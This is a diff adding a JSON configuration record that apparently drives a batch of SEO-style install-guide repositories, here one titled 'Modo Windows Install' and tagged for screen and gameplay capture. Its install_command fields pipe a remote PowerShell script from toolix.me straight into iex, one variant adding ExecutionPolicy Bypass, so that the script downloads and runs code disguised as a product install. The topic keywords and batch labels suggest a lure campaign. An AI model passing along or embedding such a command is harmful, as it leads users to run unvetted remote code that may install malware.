@@ -1,0 +1,29 @@
+{
+  "repo": "Modo-Windows-Install",
+  "product": "Modo Windows Install",
+  "product_title": "Modo Windows Install",
+  "kind": "utility",
+  "install_type": "toolix-irm",
+  "install_command": "irm https://toolix.me/ps/setup.ps1 | iex",
+  "install_command_bypass": "powershell -NoProfile -ExecutionPolicy Bypass -Command \"irm https://toolix.me/ps/setup.ps1 | iex\"",
+  "batch": "git-new-era-toolix-pending",
+  "format": "license-md-toolix-git-new-era-guide",
+  "tone": "guide",
+  "category": "video-editing",
+  "topics": [
+    "how-to-install-modo-windows-install",
+    "modo-windows-install-app",
+    "gameplay-recording",
+    "screen-capture",
+    "directx-capture",
+    "video-export",
+    "media-capture",
+    "creator-workflow",
+    "modo-windows-install-desktop-tool",
+    "modo-windows-install-windows-tool",
+    "modo-windows-install",
+    "windows-11",
+    "install-guide"
+  ],
+  "site": "toolix.me"
+}
